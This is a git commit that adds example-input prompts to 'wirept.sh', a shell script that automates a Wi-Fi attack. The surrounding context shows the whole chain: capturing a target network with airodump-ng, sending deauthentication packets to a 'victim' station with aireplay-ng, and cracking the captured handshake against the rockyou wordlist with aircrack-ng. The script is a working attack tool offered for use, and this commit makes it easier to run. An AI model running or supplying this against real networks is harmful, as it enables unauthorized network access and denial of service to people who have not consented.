d1b4e1b9de493326e7acffd9a37f1e20a2bd268f
trickdeath0 <70007454+trickdeath0@users.noreply.github.com>
2021-04-02 10:22:37 +0300

    Update wirept.sh
    I add a command line to help people know what to put in the input

--- wirept.sh
+++ wirept.sh
@@ -9,6 +9,7 @@ echo -e 	"______________________________________________________________________
 
 echo -e "Starting Wi-Fi Attack"
 echo -e " "
+echo -e "for example: wlan0 " #add this line
 read -p "Enter your adapter's name: " name
 echo -e " "
 read -p "Checking if There are Any Problematic PPID......................... (Press Enter)"
@@ -26,10 +27,13 @@ sleep 5
 command airodump-ng $name
 echo -e " "
 echo -e " "
+echo -e "for example: wifi_name " #add this line
 read -p "Enter Bssid Name: " BssidName
 echo -e " "
+echo -e "for example: 1,6,11... " #add this line
 read -p "Enter Channel: " Channel
 echo -e " "
+echo -e "for example: ff:ff:ff:ff:ff:ff " #add this line
 read -p "Enter Bssid: " Bssid
 echo -e " "
 gnome-terminal -- airodump-ng -c $Channel --bssid $Bssid $name -w /root/Desktop/$BssidName
@@ -38,14 +42,18 @@ echo -e "PCAP file saved in /root/Desktop"
 echo -e " "
 read -p "Enter Number of Attacks (10-100): " attacks
 echo -e " "
+echo -e "for example: ff:ff:ff:ff:ff:ff (The same did you write before)" #add this line
 read -p "Enter Bssid: " bssid2
 echo -e " "
+echo -e "for example: ff:ff:ff:ff:ff:ff (The second bssid in the right-side)" #add this line
 read -p "Enter Victim's Station: " victim
 command aireplay-ng --deauth $attacks -a $bssid2 -c $victim $name
 echo -e " "
 sleep 5
+echo -e "for example: /root/Desktop/wifi_01.cap " #add this line
 read -p "Enter PCAP File Path:" path
 echo -e " "
+echo -e "for example: /usr/share/wordlists/rockyou.txt " #add this line
 read -p "Enter Wordlist Path:" path2
 command aircrack-ng -w $path2 $path
 echo -e " "
